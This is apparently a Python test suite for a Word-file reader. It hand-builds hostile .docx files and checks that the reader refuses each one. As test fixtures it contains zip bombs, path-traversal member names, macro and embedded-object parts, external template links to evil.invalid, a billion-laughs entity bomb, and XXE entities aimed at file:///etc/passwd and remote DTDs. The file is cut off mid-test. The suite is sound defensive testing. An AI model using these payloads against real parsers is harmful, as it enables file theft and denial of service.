"""#48: reading the text of a Word file, and refusing a hostile one (src/clark/docx_read.py). Design: docs/handoff/design-48-word.md.

Run: python3 dev/run_tests.py test_docx_read
Every file is made in the test, from made-up text: a .docx is a zip of XML parts, so a hostile one is a zip written by hand. What
is asserted: a good file reads to headings, paragraphs, list items and table rows in order; each hostile input in the design's
table (zip bombs, too many parts, path-traversal names, a lying directory, passwords, macros, embedded objects, outside links,
entity attacks, bad encodings, deep XML, giant paragraphs, damaged and cut-short files) is refused with a plain message that names
the file; nothing is returned; and no network, disk or process is touched while reading.
"""
import builtins
import io
import random
import re
import socket
import string
import struct
import time
import unittest
import urllib.request
import warnings
import zipfile
from unittest import mock

from _paths import ROOT   # noqa: F401  (puts src/ on the path)

from clark import docx_read
from clark.docx_read import WordRefused, read

NAME = "weekly.docx"
W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
HEAD = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
MAIN = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
CONTENT_TYPES = (HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                 '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                 '<Default Extension="xml" ContentType="application/xml"/>'
                 f'<Override PartName="/word/document.xml" ContentType="{MAIN}"/></Types>')
RELS = HEAD + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{}</Relationships>'
JARGON = r"(?i)\bzip\b|\bxml\b|\bentity\b|\bdtd\b|\brelationship|traceback|exception|errno|vbaproject|\bole\b|\bexpat\b|\bparser\b"


def document(body, ns=W):
    return HEAD + f'<w:document xmlns:w="{ns}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body>{body}</w:body></w:document>'


def P(text="", style=None, num=None, ilvl=0, outline=None, hidden=False):
    ppr = (f'<w:pStyle w:val="{style}"/>' if style else "")
    if num is not None:
        ppr += f'<w:numPr><w:ilvl w:val="{ilvl}"/><w:numId w:val="{num}"/></w:numPr>'
    if outline is not None:
        ppr += f'<w:outlineLvl w:val="{outline}"/>'
    rpr = "<w:rPr><w:vanish/></w:rPr>" if hidden else ""
    return f"<w:p>{'<w:pPr>' + ppr + '</w:pPr>' if ppr else ''}<w:r>{rpr}<w:t>{text}</w:t></w:r></w:p>"


def TC(*paras):
    return f"<w:tc>{''.join(paras)}</w:tc>"


def TR(*cells):
    return f"<w:tr>{''.join(c if c.startswith('<w:tc') else TC(P(c)) for c in cells)}</w:tr>"


def TBL(*rows):
    return f"<w:tbl>{''.join(rows)}</w:tbl>"


STYLES = HEAD + f'''<w:styles xmlns:w="{W}"><w:docDefaults><w:rPrDefault><w:rPr><w:sz w:val="20"/></w:rPr></w:rPrDefault></w:docDefaults>
<w:style w:type="paragraph" w:default="1" w:styleId="Normal"><w:name w:val="Normal"/></w:style>
<w:style w:type="paragraph" w:styleId="Title"><w:name w:val="Title"/><w:basedOn w:val="Normal"/></w:style>
<w:style w:type="paragraph" w:styleId="Heading1"><w:name w:val="heading 1"/><w:basedOn w:val="Normal"/><w:pPr><w:outlineLvl w:val="0"/></w:pPr></w:style>
<w:style w:type="paragraph" w:styleId="Heading2"><w:name w:val="heading 2"/><w:basedOn w:val="Normal"/></w:style>
<w:style w:type="paragraph" w:styleId="Section"><w:name w:val="My section"/><w:basedOn w:val="Heading1"/></w:style>
<w:style w:type="paragraph" w:styleId="Loop1"><w:name w:val="Loop one"/><w:basedOn w:val="Loop2"/></w:style>
<w:style w:type="paragraph" w:styleId="Loop2"><w:name w:val="Loop two"/><w:basedOn w:val="Loop1"/></w:style>
<w:style w:type="paragraph" w:styleId="ListBullet"><w:name w:val="List Bullet"/><w:basedOn w:val="Normal"/><w:pPr><w:numPr><w:numId w:val="1"/></w:numPr></w:pPr></w:style>
</w:styles>'''
NUMBERING = HEAD + f'''<w:numbering xmlns:w="{W}">
<w:abstractNum w:abstractNumId="0"><w:lvl w:ilvl="0"><w:numFmt w:val="bullet"/></w:lvl><w:lvl w:ilvl="1"><w:numFmt w:val="decimal"/></w:lvl></w:abstractNum>
<w:abstractNum w:abstractNumId="1"><w:lvl w:ilvl="0"><w:numFmt w:val="decimal"/></w:lvl></w:abstractNum>
<w:num w:numId="1"><w:abstractNumId w:val="0"/></w:num><w:num w:numId="2"><w:abstractNumId w:val="1"/></w:num></w:numbering>'''


def docx(body="", parts=None, document_xml=None, content_types=CONTENT_TYPES, skip=(), compress=zipfile.ZIP_DEFLATED, ns=W):
    """A .docx in memory. `parts` adds or replaces parts (name -> str or bytes); `skip` leaves some out."""
    members = {"[Content_Types].xml": content_types, "_rels/.rels": RELS.format(
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'),
        "word/document.xml": document_xml if document_xml is not None else document(body, ns)}
    members.update(parts or {})
    buf = io.BytesIO()
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        with zipfile.ZipFile(buf, "w", compress) as z:
            for name, data in members.items():
                if name not in skip:
                    z.writestr(zipfile.ZipInfo(name, date_time=(2026, 10, 28, 0, 0, 0)), data, compress_type=compress)
    return buf.getvalue()


def zipped(members, compress=zipfile.ZIP_DEFLATED):
    """A zip of exactly these (name, data) pairs, names as given, repeated names kept."""
    buf = io.BytesIO()
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        with zipfile.ZipFile(buf, "w", compress) as z:
            for name, data in members:
                z.writestr(zipfile.ZipInfo(name, date_time=(2026, 10, 28, 0, 0, 0)), data, compress_type=compress)
    return buf.getvalue()


def patch_directory(data, member, offset, fmt, value):
    """`data` with one field of `member`'s entry in the zip's directory changed (offsets from the entry's signature)."""
    out, i = bytearray(data), 0
    while True:
        i = out.find(b"PK\x01\x02", i)
        if i < 0:
            raise AssertionError(f"{member} is not in the directory")
        n = struct.unpack_from("<H", out, i + 28)[0]
        if bytes(out[i + 46:i + 46 + n]) == member.encode():
            struct.pack_into(fmt, out, i + offset, value)
            return bytes(out)
        i += 4


def blocks(body, **kw):
    return read(docx(body, **kw), NAME).blocks


class Refused(unittest.TestCase):
    def refused(self, data, *words, name=NAME):
        started = time.time()
        with self.assertRaises(WordRefused) as caught:
            read(data, name)
        said = str(caught.exception)
        self.assertLess(time.time() - started, 5)
        self.assertIn(name, said)
        self.assertNotRegex(said, JARGON)
        for w in words:
            self.assertIn(w, said)
        return said


class AGoodFile(unittest.TestCase):
    def test_headings_paragraphs_lists_and_tables_in_order(self):
        body = (P("Weekly report", "Title") + P("Overview", "Heading1") + P("Detail", "Heading2") + P("A custom heading", "Section")
                + P("An outline heading", outline=2) + P("Just words")
                + P("first bullet", num=1) + P("a numbered one under it", num=1, ilvl=1) + P("a numbered list", num=2)
                + P("from the style", "ListBullet") + P("not a list after all", num=0)
                + TBL(TR("Name", "Owner"), TR("Fix the gate", "Sam Carter"), TR("", ""))
                + P("After the table"))
        got = read(docx(body, parts={"word/styles.xml": STYLES, "word/numbering.xml": NUMBERING}), NAME)
        self.assertEqual(got.blocks, [
            {"kind": "heading", "level": 1, "text": "Weekly report"},
            {"kind": "heading", "level": 1, "text": "Overview"},
            {"kind": "heading", "level": 2, "text": "Detail"},
            {"kind": "heading", "level": 1, "text": "A custom heading"},
            {"kind": "heading", "level": 3, "text": "An outline heading"},
            {"kind": "paragraph", "text": "Just words"},
            {"kind": "list_item", "level": 0, "ordered": False, "text": "first bullet"},
            {"kind": "list_item", "level": 1, "ordered": True, "text": "a numbered one under it"},
            {"kind": "list_item", "level": 0, "ordered": True, "text": "a numbered list"},
            {"kind": "list_item", "level": 0, "ordered": False, "text": "from the style"},
            {"kind": "paragraph", "text": "not a list after all"},
            {"kind": "table", "rows": [["Name", "Owner"], ["Fix the gate", "Sam Carter"]]},
            {"kind": "paragraph", "text": "After the table"}])
        self.assertEqual(got.notes, [])

    def test_a_style_that_loops_does_not_hang(self):
        self.assertEqual(blocks(P("looping", "Loop1"), parts={"word/styles.xml": STYLES}),
                         [{"kind": "paragraph", "text": "looping"}])

    def test_the_heading_styles_word_writes_are_known_without_a_styles_part(self):
        self.assertEqual(blocks(P("A", "Heading3") + P("B", "Title")),
                         [{"kind": "heading", "level": 3, "text": "A"}, {"kind": "heading", "level": 1, "text": "B"}])

    def test_runs_fields_tabs_breaks_and_content_controls_are_joined(self):
        body = ('<w:p><w:r><w:t>Pl</w:t></w:r><w:r><w:t>ain</w:t></w:r><w:r><w:tab/></w:r><w:r><w:t>text</w:t></w:r><w:r><w:br/></w:r>'
                '<w:r><w:t>next</w:t></w:r><w:r><w:noBreakHyphen/></w:r><w:r><w:t>x</w:t></w:r>'
                '<w:sdt><w:sdtPr><w:alias w:val="not text"/></w:sdtPr><w:sdtContent><w:r><w:t> control</w:t></w:r></w:sdtContent></w:sdt>'
                '<w:fldSimple w:instr=" PAGE "><w:r><w:t> 7</w:t></w:r></w:fldSimple>'
                '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> HYPERLINK "https://evil.invalid" </w:instrText></w:r>'
                '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t> shown</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
        self.assertEqual(blocks(body), [{"kind": "paragraph", "text": "Plain text\nnext-x control 7 shown"}])

    def test_tracked_changes_are_read_as_accepted(self):
        body = ('<w:p><w:r><w:t>kept </w:t></w:r><w:ins w:id="1"><w:r><w:t>added </w:t></w:r></w:ins>'
                '<w:del w:id="2"><w:r><w:delText>deleted </w:delText></w:r></w:del><w:r><w:t>end</w:t></w:r></w:p>')
        self.assertEqual(blocks(body), [{"kind": "paragraph", "text": "kept added end"}])

    def test_text_a_person_cannot_see_is_not_read_and_is_noted(self):
        body = (P("seen") + P("secret instructions", hidden=True)
                + '<w:p><w:r><w:t>box: </w:t></w:r><w:r><mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">'
                  '<mc:Choice><w:drawing><w:txbxContent><w:p><w:r><w:t>in a text box</w:t></w:r></w:p></w:txbxContent></w:drawing></mc:Choice>'
                  '<mc:Fallback><w:pict><w:txbxContent><w:p><w:r><w:t>old style box</w:t></w:r></w:p></w:txbxContent></w:pict></mc:Fallback>'
                  '</mc:AlternateContent></w:r></w:p>'
                + '<w:p><w:r><w:t>pic</w:t></w:r><w:r><w:drawing><w:t>inside a picture</w:t></w:drawing></w:r></w:p>')
        got = read(docx(body), NAME)
        self.assertEqual([b["text"] for b in got.blocks], ["seen", "box:", "pic"])
        self.assertEqual(len(got.notes), 2)
        self.assertIn("hidden", got.notes[0])
        self.assertEqual(got.notes[1], "2 pictures, drawings or text boxes were not read.")

    def test_a_link_keeps_its_words_and_loses_its_address(self):
        rels = RELS.format('<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
                           'Target="https://example.org/where" TargetMode="External"/>')
        body = '<w:p><w:hyperlink r:id="rId9"><w:r><w:t>see this page</w:t></w:r></w:hyperlink></w:p>'
        got = read(docx(body, parts={"word/_rels/document.xml.rels": rels}), NAME)
        self.assertEqual(got.blocks, [{"kind": "paragraph", "text": "see this page"}])
        self.assertNotIn("example.org", repr(got))
        self.assertEqual(len(got.notes), 1)

    def test_comments_are_not_read_and_are_noted(self):
        got = read(docx(P("body"), parts={"word/comments.xml": HEAD + f'<w:comments xmlns:w="{W}"><w:comment><w:p><w:r><w:t>hidden remark</w:t></w:r></w:p></w:comment></w:comments>'}), NAME)
        self.assertEqual(got.blocks, [{"kind": "paragraph", "text": "body"}])
        self.assertEqual(got.notes, ["Comments were not read."])

    def test_nested_tables_and_merged_cells(self):
        inner = TBL(TR("in a", "in b"))
        body = TBL(TR("Head one", "Head two"), TR(TC(P("Outer"), inner), "Right"),
                   '<w:tr><w:tc><w:tcPr><w:gridSpan w:val="2"/></w:tcPr><w:p><w:r><w:t>Spans two</w:t></w:r></w:p></w:tc></w:tr>',
                   TR(TC(P("two"), P("paragraphs")), "x"))
        self.assertEqual(blocks(body), [{"kind": "table", "rows": [
            ["Head one", "Head two"], ["Outer\nin a | in b", "Right"], ["Spans two"], ["two\nparagraphs", "x"]]}])

    def test_the_strict_namespace_reads_too(self):
        self.assertEqual(blocks(P("strict"), ns="http://purl.oclc.org/ooxml/wordprocessingml/main"),
                         [{"kind": "paragraph", "text": "strict"}])

    def test_a_template_reads_too(self):
        types = CONTENT_TYPES.replace("document.main+xml", "template.main+xml")
        self.assertEqual(blocks(P("template"), content_types=types), [{"kind": "paragraph", "text": "template"}])

    def test_text_is_cleaned_not_changed(self):
        body = P("zero\u200bwidth \u202eright\u2069 tag\U000e0041\U000e0042 nb\u00a0sp  many   spaces") + P("\u0627\u0644\u062a\u0642\u0631\u064a\u0631 caf\u00e9 \u4e2d\u6587 \U0001f600") + P("  ") + P("")
        self.assertEqual([b["text"] for b in blocks(body)],
                         ["zerowidth right tag nb sp many spaces", "\u0627\u0644\u062a\u0642\u0631\u064a\u0631 caf\u00e9 \u4e2d\u6587 \U0001f600"])

    def test_a_decomposed_letter_is_composed(self):
        self.assertEqual(blocks(P("cafe\u0301"))[0]["text"], "caf\u00e9")

    def test_the_same_file_reads_the_same(self):
        data = docx(P("Overview", "Heading1") + P("a") + P("b"), parts={"word/styles.xml": STYLES})
        self.assertEqual(read(data, NAME), read(data, NAME))

    def test_a_paragraph_of_exactly_the_limit_reads(self):
        got = blocks(P("a" * docx_read.MAX_PARAGRAPH))
        self.assertEqual(len(got[0]["text"]), docx_read.MAX_PARAGRAPH)

    def test_a_document_with_no_text_reads_to_nothing(self):
        self.assertEqual(read(docx(""), NAME), docx_read.Read([], []))


class NotAWordFile(Refused):
    def test_not_a_zip_empty_or_not_bytes(self):
        for data in (b"just some text", b"", b"PK", None, "word/document.xml", 12, b"%PDF-1.7 " + b"x" * 100):
            self.refused(data, "can't be opened")

    def test_a_path_is_never_opened(self):
        self.refused("/etc/hosts", "can't be opened")
        self.refused(b"/etc/hosts", "can't be opened")

    def test_a_cut_short_file(self):
        data = docx(P("some text") * 50)
        for cut in (len(data) // 2, len(data) - 10, 30):
            self.refused(data[:cut], "damaged or cut short")

    def test_a_flipped_byte_inside_a_part(self):
        data = bytearray(docx(P("some text " * 200)))
        i = data.find(b"word/document.xml") + 40
        data[i] ^= 0xFF
        self.refused(bytes(data), "can't be opened")

    def test_an_older_or_password_protected_file(self):
        self.refused(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 600, "password")

    def test_a_password_flag_in_the_directory(self):
        data = patch_directory(docx(P("x")), "word/document.xml", 8, "<H", 0x0001)
        self.refused(data, "password")

    def test_a_part_stored_a_way_clark_does_not_read(self):
        data = patch_directory(docx(P("x")), "word/document.xml", 10, "<H", 99)
        self.refused(data, "can't be opened")

    def test_a_zip_with_no_main_text(self):
        self.refused(docx(skip=("word/document.xml",)), "no main text")
        self.refused(docx(skip=("[Content_Types].xml",)), "no main text")
        self.refused(zipped([("hello.txt", b"hi")]), "no main text")
        self.refused(b"PK\x05\x06" + b"\0" * 18, "no main text")                       # a zip with nothing in it

    def test_a_workbook_is_not_a_word_file(self):
        types = CONTENT_TYPES.replace(MAIN, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml")
        self.refused(docx(P("x"), content_types=types), "no main text")

    def test_a_document_with_no_body(self):
        self.refused(docx(document_xml=HEAD + f'<w:document xmlns:w="{W}"/>'), "no main text")
        self.refused(docx(document_xml=HEAD + '<root><body/></root>'), "no main text")


class TooBig(Refused):
    def test_a_file_over_the_limit_as_saved(self):
        data = docx(P("x"))
        with mock.patch.object(docx_read, "MAX_FILE_BYTES", len(data) - 1):
            self.refused(data, "MB")
        with mock.patch.object(docx_read, "MAX_FILE_BYTES", len(data)):
            self.assertEqual(blocks(P("x")), [{"kind": "paragraph", "text": "x"}])

    def test_a_real_sized_file_over_the_limit(self):
        said = self.refused(b"PK" + b"\0" * (docx_read.MAX_FILE_BYTES + 1), "25.0 MB")
        self.assertIn("more than", said)

    def test_a_part_that_unpacks_to_too_much(self):
        data = docx(P("x"), parts={"word/media/image1.bin": b"\0" * (docx_read.MAX_PART_BYTES + 1)})
        self.refused(data, "will open")

    def test_parts_that_together_unpack_to_too_much(self):
        parts = {f"word/media/m{i}.bin": b"\0" * (15 * 1024 * 1024) for i in range(4)}      # 60 MB, 15 MB each, a few KB packed
        started = time.time()
        with mock.patch.object(docx_read, "MAX_RATIO", 10 ** 9):                             # so it is the total that is refused
            said = self.refused(docx(P("x"), parts=parts), "60.0 MB")
        self.assertLess(time.time() - started, 5)
        self.assertIn("would open to about", said)

    def test_a_squeeze_ratio_that_is_a_bomb(self):
        data = docx(P("x"), parts={"word/media/image1.bin": b"\0" * (3 * 1024 * 1024)})
        self.assertLess(len(data), 20_000)
        self.refused(data, "packed in an unusual way")

    def test_a_small_highly_squeezed_part_is_fine(self):
        self.assertEqual(blocks(P("ok"), parts={"customXml/item1.xml": " " * 500_000}), [{"kind": "paragraph", "text": "ok"}])

    def test_too_many_parts(self):
        parts = {f"customXml/item{i}.xml": "<a/>" for i in range(docx_read.MAX_MEMBERS)}
        self.refused(docx(P("x"), parts=parts), "too complex for clark to read", "Save a simpler copy and try again.")
        parts = {f"customXml/item{i}.xml": "<a/>" for i in range(docx_read.MAX_MEMBERS - 3)}      # three are the file's own
        self.assertEqual(blocks(P("ok"), parts=parts), [{"kind": "paragraph", "text": "ok"}])

    def test_a_directory_that_understates_a_size(self):
        data = docx(P("some text " * 500))
        self.refused(patch_directory(data, "word/document.xml", 24, "<I", 5), "can't be opened")

    def test_a_directory_that_overstates_a_size(self):
        data = docx(P("some text"))
        self.refused(patch_directory(data, "word/document.xml", 24, "<I", 0x7FFFFFFF), "will open")

    def test_a_part_whose_reader_would_run_past_the_limit(self):
        with mock.patch.object(docx_read, "SMALL_PART_BYTES", 100):
            self.refused(docx(P("x"), parts={"word/styles.xml": STYLES}), "will open")


class NextStepsAndWording(Refused):
    """Plain-words review of PR 69: every size refusal says what to do next, and nothing says "parts"."""
    SPLIT = "Split it into smaller documents and try again."

    def test_a_file_too_big_as_saved_says_to_save_a_smaller_copy(self):
        said = self.refused(b"PK" + b"\0" * (docx_read.MAX_FILE_BYTES + 1), "25.0 MB")
        self.assertTrue(said.endswith("clark will open. Save a smaller copy and try again."), said)

    def test_a_file_that_opens_too_big_says_what_to_remove(self):
        data = docx(P("x"), parts={"word/media/image1.bin": b"\0" * (docx_read.MAX_PART_BYTES + 1)})
        said = self.refused(data, "would open to about")
        self.assertTrue(said.endswith("so it was not read. Remove large pictures or split it, then try again."), said)

    def test_too_many_parts_says_too_complex_and_never_parts(self):
        parts = {f"customXml/item{i}.xml": "<a/>" for i in range(docx_read.MAX_MEMBERS)}
        said = self.refused(docx(P("x"), parts=parts), "too complex for clark to read")
        self.assertEqual(said, "weekly.docx is too complex for clark to read, so it was not read. Save a simpler copy and try again.")
        self.assertNotRegex(said, r"(?i)\bparts?\b")

    def test_an_unsafe_name_and_a_repeated_name_share_the_something_inside_sentence(self):
        want = ("weekly.docx has something inside it clark can't open safely, so it was not read. Open it in Word, save a copy "
                "and try again.")
        data = zipped([("[Content_Types].xml", CONTENT_TYPES), ("word/document.xml", document(P("x"))), ("../evil.xml", b"x")])
        self.assertEqual(self.refused(data), want)
        data = zipped([("[Content_Types].xml", CONTENT_TYPES), ("word/document.xml", document(P("one"))),
                       ("word/Document.xml", document(P("two")))])
        self.assertEqual(self.refused(data), want)

    def test_the_squeeze_ratio_has_its_own_true_sentence(self):
        data = docx(P("x"), parts={"word/media/image1.bin": b"\0" * (3 * 1024 * 1024)})
        said = self.refused(data)
        self.assertEqual(said, "weekly.docx looks packed in an unusual way, so it was not read. Open it in Word, save a copy and "
                               "try again.")
        self.assertNotIn("MB", said)       # it used to say "would open to about 3.0 MB, more than the 20.0 MB": false on its face

    def test_the_long_text_refusals_say_to_split_the_document(self):
        with mock.patch.object(docx_read, "MAX_BLOCKS", 10):
            said = self.refused(docx(P("x") * 11), "paragraphs and rows")
        self.assertTrue(said.endswith(self.SPLIT), said)
        with mock.patch.object(docx_read, "MAX_TEXT", 1000):
            said = self.refused(docx(P("x" * 400) * 3), "more text")
        self.assertTrue(said.endswith(self.SPLIT), said)
        said = self.refused(docx(P("a" * (docx_read.MAX_PARAGRAPH + 1))), "200,000")
        self.assertEqual(said, "A paragraph in weekly.docx is longer than 200,000 characters, so it was not read. " + self.SPLIT)

    def test_the_link_note_says_web_address_and_agrees_in_number(self):
        rels = RELS.format('<Relationship Id="rId%d" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
                           'hyperlink" Target="https://example.org/%d" TargetMode="External"/>' * 2)
        rels = rels % (1, 1, 2, 2)
        one = '<w:p><w:hyperlink r:id="rId1"><w:r><w:t>one</w:t></w:r></w:hyperlink></w:p>'
        two = one + '<w:p><w:hyperlink r:id="rId2"><w:r><w:t>two</w:t></w:r></w:hyperlink></w:p>'
        self.assertEqual(read(docx(one, parts={"word/_rels/document.xml.rels": rels}), NAME).notes,
                         ["The web address of 1 link was not read; the words stay."])
        self.assertEqual(read(docx(two, parts={"word/_rels/document.xml.rels": rels}), NAME).notes,
                         ["The web addresses of 2 links were not read; the words stay."])


class OnlyARealHyperlinkMayPointOutside(Refused):
    """"""
    def _outside(self, rtype):
        rels = RELS.format(f'<Relationship Id="rId1" Type="{rtype}" Target="https://example.org/a" TargetMode="External"/>')
        return docx(P("x"), parts={"word/_rels/document.xml.rels": rels})

    def test_a_type_that_only_ends_in_hyperlink_is_refused(self):
        for t in ("http://evil/x/hyperlink",
                  "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate/hyperlink",
                  "http://schemas.openxmlformats.org/officeDocument/2006/relationships/image/hyperlink",
                  "hyperlink", "/hyperlink"):
            self.refused(self._outside(t), "outside the file")

    def test_the_real_types_are_allowed_in_any_case(self):
        for t in ("http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink",
                  "HTTP://SCHEMAS.OPENXMLFORMATS.ORG/OFFICEDOCUMENT/2006/RELATIONSHIPS/HYPERLINK",
                  "http://purl.oclc.org/ooxml/officeDocument/relationships/hyperlink"):
            self.assertEqual(read(self._outside(t), NAME).blocks, [{"kind": "paragraph", "text": "x"}])


class UnsafeNames(Refused):
    def test_names_that_climb_out_or_start_at_the_root(self):
        for bad in ("../evil.xml", "word/../../evil.xml", "/etc/evil.xml", "\\evil.xml", "C:\\evil.xml", "c:evil.xml",
                    "word\\document2.xml", "word/./../x.xml", "a\x01b.xml", "x" * 300):
            data = zipped([("[Content_Types].xml", CONTENT_TYPES), ("word/document.xml", document(P("x"))), (bad, b"x")])
            self.refused(data, "something inside it clark can't open safely", "save a copy and try again")

    def test_the_same_name_twice(self):
        data = zipped([("[Content_Types].xml", CONTENT_TYPES), ("word/document.xml", document(P("one"))),
                       ("word/Document.xml", document(P("two")))])
        self.refused(data, "something inside it clark can't open safely")
        data = zipped([("[Content_Types].xml", CONTENT_TYPES), ("word/document.xml", document(P("one"))),
                       ("word/document.xml", document(P("two")))])
        self.refused(data, "something inside it clark can't open safely")

    def test_nothing_is_ever_written_to_disk(self):
        with mock.patch.object(zipfile.ZipFile, "extract", side_effect=AssertionError("extracted")), \
                mock.patch.object(zipfile.ZipFile, "extractall", side_effect=AssertionError("extracted")):
            self.refused(zipped([("../evil.xml", b"x")]))
            self.assertEqual(blocks(P("fine")), [{"kind": "paragraph", "text": "fine"}])


class MacrosObjectsAndLinks(Refused):
    def test_macros(self):
        for name in ("word/vbaProject.bin", "word/vbaData.xml", "word/vbaProjectSignature.bin", "vbaProject.bin", "word/VBAPROJECT.BIN"):
            self.refused(docx(P("x"), parts={name: b"\0\1\2"}), "macros")

    def test_a_macro_enabled_document(self):
        types = CONTENT_TYPES.replace(MAIN, "application/vnd.ms-word.document.macroEnabled.main+xml")
        self.refused(docx(P("x"), content_types=types), "macros", ".docm")
        types = CONTENT_TYPES.replace("</Types>", '<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
        self.refused(docx(P("x"), content_types=types), "macros")

    def test_a_macro_relationship(self):
        rels = RELS.format('<Relationship Id="rId5" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>')
        self.refused(docx(P("x"), parts={"word/_rels/document.xml.rels": rels}), "macros")

    def test_embedded_objects(self):
        for name in ("word/embeddings/oleObject1.bin", "word/embeddings/Microsoft_Excel_Worksheet.xlsx", "word/activeX/activeX1.xml",
                     "word/activeX/activeX1.bin", "word/oleObject2.bin"):
            self.refused(docx(P("x"), parts={name: b"\0"}), "inside it")

    def test_an_object_relationship_or_content_type(self):
        for kind in ("oleObject", "package", "activeXControl"):
            rels = RELS.format(f'<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/{kind}" Target="x.bin"/>')
            self.refused(docx(P("x"), parts={"word/_rels/document.xml.rels": rels}), "inside it")
        types = CONTENT_TYPES.replace("</Types>", '<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/></Types>')
        self.refused(docx(P("x"), content_types=types), "inside it")

    def test_a_link_to_something_outside_that_is_not_a_hyperlink(self):
        for kind, target in (("attachedTemplate", "https://evil.invalid/t.dotm"), ("image", "https://evil.invalid/p.png"),
                             ("frame", "https://evil.invalid/f"),
                             ("subDocument", "\\\\evil.invalid\\share\\x.docx"), ("externalLink", "https://evil.invalid/x.xlsx"),
                             ("settingsWebpage", "https://evil.invalid/s")):
            rels = RELS.format(f'<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/{kind}" '
                               f'Target="{target}" TargetMode="External"/>')
            self.refused(docx(P("x"), parts={"word/_rels/document.xml.rels": rels}), "outside the file")

    def test_the_same_in_the_settings_or_a_header_relationships(self):
        rels = RELS.format('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                           'Target="https://evil.invalid/t.dotm" TargetMode="External"/>')
        for name in ("word/_rels/settings.xml.rels", "word/_rels/header1.xml.rels", "_rels/.rels"):
            self.refused(docx(P("x"), parts={name: rels}), "outside the file")

    def test_an_ordinary_hyperlink_is_allowed(self):
        rels = RELS.format('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
                           'Target="https://example.org/a" TargetMode="External"/><Relationship Id="rId2" '
                           'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>')
        self.assertEqual(blocks(P("ok"), parts={"word/_rels/document.xml.rels": rels, "word/styles.xml": STYLES}),
                         [{"kind": "paragraph", "text": "ok"}])


class HostileXml(Refused):
    LOL = (HEAD + '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
           '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
           '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
           '<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">'
           '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">'
           '<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">'
           '<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">'
           '<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]>'
           f'<w:document xmlns:w="{W}"><w:body><w:p><w:r><w:t>&lol9;</w:t></w:r></w:p></w:body></w:document>')

    def test_billion_laughs_in_the_document(self):
        self.refused(docx(document_xml=self.LOL), "can't read safely")

    def test_quadratic_blowup_in_the_document(self):
        big = "x" * 50_000
        xml = (HEAD + f'<!DOCTYPE d [<!ENTITY a "{big}">]><w:document xmlns:w="{W}"><w:body><w:p><w:r><w:t>'
               + "&a;" * 20_000 + "</w:t></w:r></w:p></w:body></w:document>")
        self.refused(docx(document_xml=xml), "can't read safely")

    def test_an_external_entity_is_never_fetched(self):
        calls = []

        def spy(*a, **k):
            calls.append(a)
            raise AssertionError("network used")

        for target in ("file:///etc/passwd", "https://evil.invalid/x.dtd", "//evil.invalid/x", "/etc/hosts", "ftp://evil.invalid/x"):
            xml = (HEAD + f'<!DOCTYPE d [<!ENTITY xxe SYSTEM "{target}">]><w:document xmlns:w="{W}"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>'
                   "</w:body></w:document>")
            with mock.patch.object(socket.socket, "connect", spy), mock.patch.object(socket, "create_connection", spy), \
                    mock.patch.object(socket, "getaddrinfo", spy), mock.patch.object(urllib.request, "urlopen", spy):
                self.refused(docx(document_xml=xml), "can't read safely")
        self.assertEqual(calls, [])

    def test_a_parameter_entity_and_an_external_subset(self):
        for dtd in ('<!DOCTYPE d [<!ENTITY % p SYSTEM "https://evil.invalid/p.dtd"> %p;]>', '<!DOCTYPE d SYSTEM "https://evil.invalid/d.dtd">',
                    '<!doctype d [<!entity x "y">]>', '<!DOCTYPE d [<!NOTATION n SYSTEM "x">]>', "<!DOCTYPE d>"):
